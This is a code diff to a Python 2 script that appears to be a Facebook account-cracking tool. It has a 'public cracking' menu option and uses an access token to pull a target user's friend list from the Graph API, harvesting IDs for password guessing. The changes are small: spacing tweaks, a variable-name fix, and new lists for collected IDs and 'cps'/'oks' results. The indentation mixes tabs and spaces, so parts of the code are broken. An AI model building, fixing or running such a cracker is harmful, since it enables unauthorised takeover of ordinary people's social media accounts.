@@ -190,7 +190,7 @@ def menu():
 		time.sleep(1)
 		methodlogin()
 	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+		otw = requests.get('https://graph.facebook.com/me?access_token='+ toket)
 		a = json.loads(otw.text)
 		nama = a['name']
 		id = a['id']
@@ -253,6 +253,9 @@ def super():
 	pilih_super()
 
 def pilih_super():
+	id = []
+        cps = []
+        oks = []
 	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
         if peak =="1":
 		print '\033[1;31;1m~~~~ public cracking ~~~~'
@@ -294,7 +297,7 @@ def pilih_super():
                 idt = raw_input(' \033[1;93m[★]Enter id: ')
 		
 	try:
-		jok = requests.get('https://graph.facebook.com/' + idlist + '/friends?access_token=' + toket)
+		jok = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token='+ toket)
 		op = json.loads(jok.text)
 		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
 	except KeyError:
@@ -302,7 +305,7 @@ def pilih_super():
 		raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 		super()
 		print"\033[1;97m[✔] Getting IDs..."
-		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token='+ toket)
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
